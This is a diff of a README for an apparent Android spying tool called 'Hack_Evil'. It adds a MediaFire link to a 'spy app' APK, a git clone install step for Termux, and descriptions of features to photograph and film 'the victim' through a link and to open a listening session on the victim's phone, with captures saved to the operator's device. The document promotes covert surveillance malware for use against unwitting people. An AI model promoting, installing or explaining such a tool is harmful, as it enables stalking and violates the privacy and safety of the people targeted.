@@ -4,6 +4,10 @@ The best tool for shooting photos and videos via a link And open a session for a
 Spy app download link: https://www.mediafire.com/file/norgkaq9l2ffpuo/INTERNET.apk/file
 
 
+To install the tools on Termux, copy these commands
+
+👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
+
 ```
 git clone https://github.com/Aladdin-sd/Hack_Evil
 ```
@@ -18,9 +22,17 @@ Do not forget to support me on my Facebook account 🇸🇩
 https://www.facebook.com/X.11Android
 
 
-When opening the tool, the number 1 represents a photograph via a link
-Figure 2 is a video capture of a link
-And the number 3 is to open a listening session in the apk application in the target phone
+Figure 1
+You can film the victim via a link...
+
+Figure 2
+You can film the victim a 10-second video.
+
+Figure 3
+You can open a listening session on the victim's phone via the apk application …
+
+note:-
+Captured photos and videos are saved in your phone's main storage❤️
 
 ![alt text](https://github.com/Aladdin-sd/Hack_Evil/blob/main/Screenshot_20230418-154930.png)
 
